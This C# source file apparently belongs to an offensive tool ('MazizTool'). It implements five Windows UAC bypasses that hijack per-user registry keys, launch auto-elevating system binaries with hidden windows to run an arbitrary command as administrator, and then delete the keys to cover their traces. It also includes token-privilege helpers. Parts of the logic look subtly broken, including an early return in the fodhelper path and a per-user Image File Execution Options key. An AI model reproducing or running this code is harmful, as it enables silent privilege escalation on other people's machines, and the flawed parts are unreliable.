using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using MazizTool.Native;

namespace MazizTool.Features
{
    public static class UacBypass
    {
        public enum BypassMethod
        {
            FodHelper,
            ComputerDefaults,
            EventViewer,
            Sdclt,
            WSReset
        }

        public static List<BypassMethod> GetAvailableMethods()
        {
            var methods = new List<BypassMethod>();
            if (File.Exists(Path.Combine(Environment.SystemDirectory, "fodhelper.exe")))
                methods.Add(BypassMethod.FodHelper);
            if (File.Exists(Path.Combine(Environment.SystemDirectory, "computerdefaults.exe")))
                methods.Add(BypassMethod.ComputerDefaults);
            if (File.Exists(Path.Combine(Environment.SystemDirectory, "eventvwr.exe")))
                methods.Add(BypassMethod.EventViewer);
            if (File.Exists(Path.Combine(Environment.SystemDirectory, "sdclt.exe")))
                methods.Add(BypassMethod.Sdclt);
            if (File.Exists(Path.Combine(Environment.SystemDirectory, "wsreset.exe")))
                methods.Add(BypassMethod.WSReset);
            return methods;
        }

        public static bool ExecuteWithUacBypass(string command, BypassMethod method = BypassMethod.FodHelper)
        {
            try
            {
                switch (method)
                {
                    case BypassMethod.FodHelper:
                        return BypassViaFodHelper(command);
                    case BypassMethod.ComputerDefaults:
                        return BypassViaComputerDefaults(command);
                    case BypassMethod.EventViewer:
                        return BypassViaEventViewer(command);
                    case BypassMethod.Sdclt:
                        return BypassViaSdclt(command);
                    case BypassMethod.WSReset:
                        return BypassViaWSReset(command);
                    default:
                        return false;
                }
            }
            catch
            {
                return false;
            }
        }

        private static bool BypassViaFodHelper(string command)
        {
            try
            {
                using (var key = Registry.CurrentUser.OpenSubKey(@"Software\Classes\ms-settings\shell\open\command", true))
                {
                    if (key == null) return false;
                }
                Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\shell\open\command").Close();
                using (var key = Registry.CurrentUser.OpenSubKey(@"Software\Classes\ms-settings\shell\open\command", true))
                {
                    key.SetValue("", command);
                    key.SetValue("DelegateExecute", "");
                }
                Process.Start(new ProcessStartInfo
                {
                    FileName = Path.Combine(Environment.SystemDirectory, "fodhelper.exe"),
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                });
                System.Threading.Thread.Sleep(3000);
                Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings", false);
                return true;
            }
            catch { return false; }
        }

        private static bool BypassViaComputerDefaults(string command)
        {
            try
            {
                using (var key = Registry.CurrentUser.OpenSubKey(@"Software\Classes\ms-settings\shell\open\command", true))
                {
                    if (key != null)
                    {
                        key.SetValue("", command);
                        key.SetValue("DelegateExecute", 0);
                    }
                    else
                    {
                        var newKey = Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\shell\open\command");
                        newKey.SetValue("", command);
                        newKey.SetValue("DelegateExecute", 0);
                        newKey.Close();
                    }
                }
                Process.Start(new ProcessStartInfo
                {
                    FileName = Path.Combine(Environment.SystemDirectory, "computerdefaults.exe"),
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                });
                System.Threading.Thread.Sleep(3000);
                Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings", false);
                return true;
            }
            catch { return false; }
        }

        private static bool BypassViaEventViewer(string command)
        {
            try
            {
                var keyPath = @"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\eventvwr.exe";
                using (var key = Registry.CurrentUser.CreateSubKey(keyPath))
                {
                    key.SetValue("Debugger", command);
                }
                Process.Start(new ProcessStartInfo
                {
                    FileName = Path.Combine(Environment.SystemDirectory, "eventvwr.exe"),
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                });
                System.Threading.Thread.Sleep(3000);
                Registry.CurrentUser.DeleteSubKeyTree(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\eventvwr.exe", false);
                return true;
            }
            catch { return false; }
        }

        private static bool BypassViaSdclt(string command)
        {
            try
            {
                using (var key = Registry.CurrentUser.OpenSubKey(@"Software\Classes\Folder\shell\open\command", true))
                {
                    if (key != null)
                    {
                        key.SetValue("", command);
                        key.SetValue("DelegateExecute", "");
                    }
                    else
                    {
                        var newKey = Registry.CurrentUser.CreateSubKey(@"Software\Classes\Folder\shell\open\command");
                        newKey.SetValue("", command);
                        newKey.SetValue("DelegateExecute", "");
                        newKey.Close();
                    }
                }
                Process.Start(new ProcessStartInfo
                {
                    FileName = Path.Combine(Environment.SystemDirectory, "sdclt.exe"),
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                });
                System.Threading.Thread.Sleep(3000);
                Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\Folder", false);
                return true;
            }
            catch { return false; }
        }

        private static bool BypassViaWSReset(string command)
        {
            try
            {
                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command"))
                {
                    key.SetValue("", command);
                    key.SetValue("DelegateExecute", "");
                }
                Process.Start(new ProcessStartInfo
                {
                    FileName = Path.Combine(Environment.SystemDirectory, "wsreset.exe"),
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                });
                System.Threading.Thread.Sleep(3000);
                Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2", false);
                return true;
            }
            catch { return false; }
        }

        public static bool EnablePrivilege(string privilege)
        {
            try
            {
                IntPtr token;
                if (!Win32.OpenProcessToken(Process.GetCurrentProcess().Handle,
                    Win32.TOKEN_ADJUST_PRIVILEGES | Win32.TOKEN_QUERY, out token))
                    return false;

                Win32.LUID luid;
                if (!Win32.LookupPrivilegeValue(null, privilege, out luid))
                    return false;

                Win32.TOKEN_PRIVILEGES tp = new Win32.TOKEN_PRIVILEGES
                {
                    PrivilegeCount = 1,
                    Luid = luid,
                    Attributes = Win32.SE_PRIVILEGE_ENABLED
                };

                bool result = Win32.AdjustTokenPrivileges(token, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
                Win32.CloseHandle(token);
                return result;
            }
            catch { return false; }
        }

        public static bool ElevateProcess(string exePath, string args = "")
        {
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = exePath,
                    Arguments = args,
                    UseShellExecute = true,
                    Verb = "runas",
                    WindowStyle = ProcessWindowStyle.Normal
                };
                Process.Start(psi);
                return true;
            }
            catch { return false; }
        }
    }
}
